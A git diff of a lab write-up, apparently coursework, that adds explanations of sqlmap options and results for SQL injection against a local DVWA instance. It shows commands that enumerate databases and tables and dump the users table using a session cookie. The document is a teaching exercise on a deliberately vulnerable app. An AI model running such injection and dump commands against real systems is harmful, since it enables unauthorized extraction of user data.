@@ -226,6 +226,12 @@ Enter any value for this to retun a url : `http://localhost/vulnerabilities/sqli
 
 Get cookie value of website: PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3
 
+- -u: This option specifies the target URL that sqlmap will test for SQL injection vulnerabilities.
+
+- --cookie: This option allows you to provide specific cookies that should be sent along with the request. 
+
+- --data: This option is used to send data in a POST request.
+- --dbs:This option tells sqlmap to enumerate the databases on the server if an SQL injection vulnerability is detected. It attempts to retrieve a list of all databases present in the database management system.
 
 ```bash
 sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --dbs
@@ -233,28 +239,43 @@ sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tf
 
 ![image](https://github.com/user-attachments/assets/0a9fd479-4d89-43ba-9f3a-56db673d3400)
 
+Return 2 available databases named : dvwa and information_schema
+
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
 
 ## 1. Choice Database is dvwa and Use sqlmap to get table 
 
+-D: This option specifies the database name that sqlmap should target.
+--tables:
+This option tells sqlmap to enumerate the tables within the specified database (in this case, dvwa). If the dvwa database is found and accessible, sqlmap will retrieve and display a list of its tables.
+
+
 ```bash
 sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa --tables
 ```
 
+
+
 ![image](https://github.com/user-attachments/assets/13a09125-e859-4705-8e9c-50f30622f3be)
+
+Return 2 tables named : guestbook and users
 
 ## 2. Choice Database is Users and  use sqlmap to get  users information
 
+
+-T: Specifies the target table to operate on.
+--dump:
+This option tells sqlmap to extract and display the contents of the specified table (users). It retrieves all rows and columns from the users table
 
 ```bash
 sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa -T users --dump
 ```
 
+Retrun all columns and all row of table named users
+
 ![image](https://github.com/user-attachments/assets/70f0eef2-adaa-4242-b3d2-279322f1da2b)
-
-
 
 
 
